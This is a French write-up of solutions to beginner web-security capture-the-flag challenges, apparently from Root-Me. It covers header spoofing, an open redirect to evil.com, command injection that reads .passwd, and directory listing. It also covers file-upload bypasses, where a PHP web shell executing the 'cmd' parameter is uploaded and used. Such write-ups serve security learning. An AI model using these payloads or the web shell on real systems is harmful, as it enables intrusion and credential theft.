## HTML Code Source

Inspecter l'élément et Expand All, on peut voir deux commentaires HTML et à l'intérieur, nous avons le mot de passe !

## HTTP - Contournement de Filtrage IP

En faisant la commande suivante, on indique dans la requête que nous demandons l'accès à la page depuis une adresse IP privé pour contourner la page de connexion :
```sh
curl -H "X-Forwarded-For: 10.0.0.1" http://URL_DU_SITE
```

Et, nous avons maintenant le mot de passe !


## HTTP - Open Redirect

En arrivant sur la page, on remarque qu'il n'y a seulement des liens de réseaux sociaux disponibles comme Facebook, Twitter & Slack.
Sauf que ces liens, écrits en HTML, sont écrits sous forme suivante :

```html
<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
```
On peut voir que le lien prend l'url de la page actuelle et utilise deux params :
- `url` : ce params corresponds à l'url de destination
- `h` : ce params corresponds au Hash en MD5 de l'url de de destination
(en faisant une recherche sur le site [Hashes](https://hashes.com/en/tools/hash_identifier), on peut voir l'algorithme de hash utilisé, et même sa valeur de départ…) 

Donc, nous avons définir un nouveau lien qui emmènera vers une autre page comme https://evil.com et que nous allons hasher en MD5 :
```sh
echo -n "https://evil.com" | md5sum
```

Voici notre lien que nous allons donné au site web du challenge :
```sh
?url=https://evil.com&h=7a1eb5272a0de83226e7a50d14334056
```

Avant de le renseigner dans le navigateur, on doit désactiver le javascript de notre navigateur : Sur Kali Linux, on a Firefox et si on va dans l'onglet `about:config`, on fait passer cette valeur à `false` :
```sh
javascript.enabled 									false
```

Une fois fait, nous avons bien une nouvelle page qui s'affiche où on peut trouver le mot de passe !

## HTTP - User Agent

En faisant la commande suivante, on indique dans la requête que nous demandons l'accès à la page avec un user agent appelé `admin` pour contourner la page :
```sh
curl -A "admin" http://URL_DU_SITE
```

Et, nous avons maintenant le mot de passe ! 

## Mot de passe faible

Rien à dire : Identifiant : `admin` / Mot de passe : `admin`

## PHP - Injection de Commande

On nous indique que nous devons lire le contenu du fichier `index.php`.

Nous avons un site avec un input pour renseigner une adresse IP que le serveur va `ping` et afficher le résultat sur la page. Alors, on indique qu'on veut faire le ping, puis exécuter la commande suivante pour afficher le contenu du fichier :
```sh
127.0.0.1 ; php -s index.php
```
Le séparateur `;` nous permet d'exécuter une autre commande et nous avons utilisé `php -s` pour faire afficher en sortie la syntaxe HTML avec le code PHP surligné.

On peut voir la variable $flag suivante, qui nous parle d'un fichier `.passwd` :
```php
$flag = "".file_get_contents(".passwd")."";
```

Donc, nous avons besoin de faire afficher le contenu du fichier avec la commande suivante :
```sh
127.0.0.1 ; cat .passwd
```

Et, nous obtenons le mot de passe !

## Fichier de sauvegarde

Nous avons une page de login et l'indication de fichier de sauvegarde.
Nous devons trouver l'extension de fichier de sauvegarde de notre page de connexion :
- `.bak`
- `.old` 
- `.~`
et celui qui est présent, a le nom `index.php~`. On l'affiche avec curl :
```sh
curl http://URL_DU_SITE/index.php~
```

Et, on obtient les identifiants de connexion !

## Directory Indexing

Nous arrivons devant une page blanche. Analysons alors le code et on trouve le commentaire suivant : 
```php
include("admin/pass.html")
```

Allons voir le contenu de ce fichier, et nous sommes tombés dans le piège du développeur. 
```sh
http://URL_DU_SITE/admin/pass.html
```

Pour autant, ce piège nous indique qu'il y a bien un dossier `admin`, allons plutôt voir la page indexé au dossier : un `Index of /` !

```sh
http://URL_DU_SITE/admin/
```

Nous pouvons voir grâce a cette page, les différents fichiers ou dossiers présents dans le dossier `admin`, et nous avons un dossier `backup` avec le fichier `admin.txt` : 
```sh
http://URL_DU_SITE/admin/backup/admin.txt
```

Et, nous obtenons le mot de passe :

## HTTP Headers

Cette indice nous indique que nous allons manipuler le `header`, ou "en-tête" en français, de notre requête vers la page pour avoir l'accès admin.

Il est possible d'utiliser Burp Suite mais curl fera l'affaire et avec plusieurs tentatives, voici le seul Header qui a marché :
```sh
curl -H "Header-RootMe-Admin: admin" http://URL_DU_SITE
```

Et, nous avons le mot de passe !

## HTTP - POST

Nous avons un jeu complètement injuste où nous devons dépassé le score de `999999` du développeur... Ici, nous devons trouver un moyen de modifier notre score pour qu'il dépasse celui du développeur, sans faire de multiples tentatives sur le site. (Oui, on va tricher !)

Pour cela, on va utiliser `Burp Suite`, qui va se placé en tant que Proxy, en intermédiaire entre notre navigateur client et le serveur, et qui va pouvoir intercepter notre requête et permettre de la modifier.

Tout d'abord, nous allons dans les paramètres de notre Navigateur et nous indiquons l'adresse IP du Proxy (Burp), qui est par défaut : `127.0.0.1:8080`.

On ouvre maintenant Burp, dans l'onglet Proxy et Intercept, puis on clique pour avoir `Intercept is on`. Puis, on fais une tentative du jeu depuis notre navigateur, de retour sur Burp, on peut voir notre requête avec le `query` score :

```sh
score=623530&generate=Give+a+try%21
score=1000000000000000000000&generate=Give+a+try%21
```

On définit un score arbitrairement plus grand que `999999` et on clique sur `Forward`, pour envoyer notre requête au serveur. 
Et, on obtient le mot de passe !

## HTTP - Redirection invalide

Nous arrivons devant une page de connexion et ayant pour indice de trouver un moyen d'afficher la page index.php et de ne pas utiliser notre navigateur web.

Nous allons devoir utiliser curl pour afficher le contenu de la page index.php, avec la commande suivante :
```sh
curl http://URL_DU_SITE/index.php
```

Et, nous avons le mot de passe !

> Dans cet exercice, le navigateur web a pour fonctionnement d'effectuer chaque redirection que le serveur lui demande sans réfléchir, d'où l'indice.
> 
> Avec curl, si nous le précisons pas, il ne fait pas de redirection automatique ! C'est ainsi que nous pu voir le contenu de page `index.php` alors que son code précise bien une redirection vers la page `login.php` étant donne que nous ne sommes pas connecté.
> 
> Le développeur précise justement que le problème était dû au manque de l'instruction `exit()` après l'instruction de redirection en PHP `header('Location: ...')`, qui fait que PHP renvois le contenu de la page.

## HTTP - Verb tampering

Nous avons une alert qui nous demande de nous connecter pour accéder à la page, le navigateur ne nous serviras pas ici encore. L'indice nous indique que nous pouvons contourner les mécanismes de sécurité en manipulant les requêtes HTTP. Pour cela, nous allons utiliser curl et utiliser les differentes méthodes de requêtes HTTP :
- GET
- POST
- PUT
- DELETE

Les méthodes GET et POST ont été bloques mais pas PUT et DELETE. 
Voici les commandes curl suivantes : 
```sh
curl -X PUT http://URL_DU_SITE/
curl -X DELETE http://URL_DU_SITE/
```

Et, on obtient le mot de passe !

## Install files

Nous avons une page blanche, en inspectant le code, nous avons seulement un commentaire nous indiquant l'existante du dossier `/phpbb`, comme préciser dans l'indice. Il nous dit aussi qu'il n'a pas fini de l'installer alors on va chercher ces fichier d'installation.

En cherchant, on tombe sur un dossier `/install`. En y allant, on tombe sur  un `Index of /` avec le fichier `install.php`! On clique dessus et le script PHP s'exécute, et on a le mot de passe !

> Comme préciser par le développeur, cette faille est du a l'oubli de supprimer les fichiers d'installation de PHPBB, ce qui nous permet dans un cas réel, de réinitialiser le forum et de changer tous les mot de passes car on le réinstalle !

## File Upload - Double extensions

Nous arrivons sur un site avec plusieurs pages en liens avec des photos (émotes, app, devices, catégories, etc.) mais il y a un lien intéressant, c'est celui de `upload` où l'on peut faire télécharger au serveur des images sous format `.gif`, `.jpg` et `.png`.

Le but est de faire télécharger un code php qui nous permettent d'afficher le fichier `.passwd` à la racine, ce qui est notamment préciser en indice du défi.

Il indique "Double extensions", en recherchant sur Internet, je trouve que les fichiers `.php` peuvent être convertit en `.php.jpg` ou autre, et toujours fonctionner ! 

J'ai écrit et uploade ce code PHP qui permet d'exécuter des commandes `shell` depuis l'url en méthode GET avec le params `cmd` :
```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
}
?>
```

```sh
http://URL_DU_SITE/galerie/upload/97e70afeabcafb72cdc02329879ca861/shell.php.jpg
```

Une fois upload, on doit ajouter dans l'url le params cmd et de commencer pour se repérer, à faire la commande ls -la pour lister les éléments presents dans le dossier actuelle :
```sh
?cmd=ls la
```

On peux voir notre code shell mais nous devons trouver la racine où se trouve le fichier `.passwd` et que l'on trouve ici :
```sh
?cmd=ls la ../../../
```

On utilise cat pour l'afficher et on a le mot de passe !
```sh
?cmd=cat ../../../.passwd
```

## File Upload - Type MIME

Nous arrivons sur un site avec plusieurs pages en liens avec des photos (émotes, app, devices, catégories, etc.) mais il y a un lien intéressant, c'est celui de `upload` où l'on peut faire télécharger au serveur des images sous format `.gif`, `.jpg` et `.png`.

Le but est de faire télécharger un code PHP qui nous permettent d'afficher le fichier `.passwd` à la racine, ce qui est notamment préciser en indice du défi.

J'ai écrit et uploade ce code PHP qui permet d'exécuter des commandes `shell` depuis l'url en méthode GET avec le params `cmd` :
```php
<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
if (isset($_REQUEST['cmd'])) {
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
}
?>
```

Cette fois-ci, le serveur web affiche l'image avec la balise HTML `<img>` le fichier uploadé car il a l'extension `.jpg`, ce qui provoque évidemment une erreur d'affichage et un blocage de l'exécution du fichier PHP. 

On doit alors forcer le téléchargement du fichier avec son extension `.php`, sauf que le Javascript du Site web nous bloque avec les extensions `.gif`, `.jpg` et `.png` uniquement. 

La solution est d'utiliser `Burp Suite`, qui va se placé en tant que Proxy, en intermédiaire entre notre navigateur client et le serveur, et qui va pouvoir intercepter notre requête et permettre de la modifier.

Tout d'abord, nous allons dans les paramètres de notre Navigateur et nous indiquons l'adresse IP du Proxy (Burp), qui est par défaut : `127.0.0.1:8080`.

On ouvre maintenant Burp, dans l'onglet Proxy et Intercept, puis on clique pour avoir `Intercept is on`. Puis, on upload le fichier en `.php.jpg` depuis notre navigateur, de retour sur Burp, on peut voir notre requête avec le nom du fichier avec l'extension `.php.jpg`. 

On renomme le fichier en `.php` et on clique sur `Forward`, pour envoyer notre requête au serveur. Et, le fichier a bien été uploadé sur le serveur :
```sh
http://URL_DU_SITE/galerie/upload/437h893h84h03u48/shell.php
```

Une fois uploadé, on doit ajouter dans l'url le params `cmd` et de commencer pour se repérer, à faire la commande ls -la pour lister les éléments présents dans le dossier actuelle :
```sh
?cmd=ls -la
```

On peux voir notre code shell mais nous devons trouver la racine où se trouve le fichier `.passwd` et que l'on trouve ici :
```sh
?cmd=ls -la ../../../
```

On utilise cat pour l'afficher et on a le mot de passe !
```sh
?cmd=cat ../../../.passwd
```